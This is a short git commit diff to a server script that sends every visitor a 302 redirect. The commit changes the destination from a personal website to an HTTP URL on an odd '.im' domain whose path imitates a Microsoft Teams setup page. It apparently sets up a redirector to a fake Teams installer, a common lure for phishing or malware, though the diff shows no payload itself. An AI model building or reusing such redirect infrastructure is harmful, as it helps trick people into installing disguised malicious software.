1bde97187bc9810f53026d0b8cfa6fc156d00065
Digital2025001 <bosmichael30@gmail.com>
2025-12-08 11:48:42 -0800

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://nikitabhat.com/", // Replace this with your actual link
+      Location: "http://03nteams0kly.im/Msteam/teams/setup/", // Replace this with your actual link
     },
   });
 });
